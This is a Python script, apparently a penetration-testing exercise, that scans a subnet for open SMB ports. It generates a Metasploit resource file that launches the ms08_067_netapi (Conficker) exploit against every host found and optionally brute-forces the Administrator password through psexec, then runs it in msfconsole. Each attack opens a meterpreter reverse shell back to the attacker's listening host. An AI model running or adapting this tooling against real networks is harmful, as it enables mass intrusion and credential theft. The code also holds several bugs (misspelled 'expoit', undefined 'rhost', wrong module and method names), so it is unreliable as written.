import os
import optparse
import sys
import nmap

# Scan a subnet for computers with port 445 (SMB) open
def findTgts(subNet):
	nmScan = nmap.PortScanner()
	nmScan.scan(subNet, '445')
	tgtHosts = []
	for host in nmScann.all_hosts():
		if nmScan[host].has_tcp(445):
			state = nmScan[host]['tcp'][445]['state']
			if state == 'open':
				print '[+] Found Target Host: ' + host
				tgtHosts.append(host)
	return tgtHosts

# Configure the MSF reverse tcp handler
def setupHandler(configFile, lhost, lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' + str(lport) +'\n')
	configFile.write('set LHOST ' + str(lhost) +'\n')
	# Start as job (-j) and do not interact immediately (-z)
	configFile.write('expoit -j -z\n')
	# Mark that the payload handler has been started
	configFile.write('setg DisablePayloadHandler 1\n')

# Create MSF Config to launch ms08_067_netapi against target
def confickerExploit(configFile, tgtHost, lhost, lport):
	configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
	configFile.write('set RHOST ' + str(rhost) + '\n')
	configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' + str(lport) +'\n')
	configFile.write('set LHOST ' + str(lhost) +'\n')
	# Start as job (-j) and do not interact immediately (-z)
	configFile.write('expoit -j -z\n')
	
# Create MSF Config to attempt brute force connect to smb server
def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	username = 'Administrator'
	pF = open(passwdFile, 'r')
	for password in pF.readLines():
		password = password.strip('\n').strip('\r')
		configFile.write('use exploit/windows/smb/psexec\n')
		configFile.write('set SMBUser ' + str(username) + '\n')
		configFile.write('set SMBPass ' + str(password) + '\n')
		configFile.write('set RHOST ' + str(rhost) + '\n')
		configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
		configFile.write('set LPORT ' + str(lport) +'\n')
		configFile.write('set LHOST ' + str(lhost) +'\n')
		# Start as job (-j) and do not interact immediately (-z)
		configFile.write('expoit -j -z\n')
		

def main():
	configFile = open('meta.rc', 'w')
	parser = optParse.OptionParser('[-] Usage%prog -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
	parser.add_option('-H', dest='tgtHost', type='string', help='specify the target address[es]')
	parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
	parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
	parser.add_option('-F', dest='passwdFile', type='string', help='password file for SMB brute force attempt')

	(options, args) = parser.parse_args()
	# target host and listen host are required
	if (options.tgtHost == None) | (options.lhost == None):
		print parser.usage
		exit(0)

	lhost = options.lhost

	# listen port default if not set
	lport = options.lport
	if lport == None:
		lPort = '1337'

	passwdFile = options.passwdFile

	# Find targets with SMB port open in the given subnet
	tgtHosts = findTgts(options.tgtHost)

	# Set up a reverse shell listen handler
	setupHandler(configFile, lhost, lport)

	# For each host that nmap returned
	for tgtHost in tgtHosts:
		# Set up the conficker payload
		confickerExploit(configFile, tgtHost, lhost, lport)
		if passwdFile != None:
			# Attempt smb brute force if wordlist is provided
			smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
	configFile.close()

	# Launch the script in the msfconsole
	os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
	main()

